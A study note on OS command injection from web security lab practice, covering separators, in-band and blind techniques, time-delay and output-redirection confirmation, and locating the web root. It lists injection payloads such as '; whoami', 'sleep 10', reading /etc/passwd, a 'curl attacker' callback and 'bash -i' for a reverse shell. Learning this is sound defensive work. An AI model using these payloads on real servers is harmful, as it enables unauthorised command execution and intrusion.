# OS Command Injection

## What is it
Injecting OS terminal commands into web application
inputs — executing arbitrary commands on the server.

## Why it's dangerous
```
whoami          → identify server user
cat /etc/passwd → read sensitive files
ls -la          → list all files
curl attacker   → confirm code execution
bash -i         → full reverse shell
```

## Types

### In-band
Output visible directly in response:
```
productId=1; whoami
→ response shows "www-data"
```

### Blind
Command executes but output is hidden.
Must use indirect methods to confirm.

## Command separators

| Separator | Behavior |
|---|---|
| ; | Run next command regardless |
| && | Run if first succeeds |
| ll | Run if first fails |
| l | Pipe output to next command |
| & | Run in background |

## Techniques

### Basic injection
```
productId=1; whoami
productId=1 | whoami
productId=1 && whoami
productId=1 || whoami
```

### Blind — time delay
```
productId=1; sleep 10
productId=1 & sleep 10 &
```
Response takes 10 seconds → injection confirmed!

### Blind — output redirection
```
& whoami > /var/www/html/output.txt &
```
Fetch output via browser:
```
https://website.com/output.txt
```


## Finding web root
| Method | Example |
|---|---|
| Error messages | Leak full file paths |
| Config files | /etc/apache2/sites-enabled/000-default.conf |
| Common Linux | /var/www/html/ |
| Common Windows | C:\inetpub\wwwroot\ |

## Tools used
- Burp Suite Repeater
- interactsh (free Collaborator alternative) ❌
- netcat (reverse shell listener) ❌

## Labs completed
- Lab 1: Simple case ✅
- Lab 2: Blind with time delays ✅
- Lab 3: Blind with output redirection ✅
- Lab 4: Blind OAST ❌ requires Burp Pro (Skipped)
- Lab 5: Blind OAST data exfiltration ❌ requires Burp Pro (Skipped)

## Key learnings
- ; and & are most reliable separators
- Time delay confirms blind injection
- Must know web root for output redirection
- Out of band needs Burp Pro or interactsh
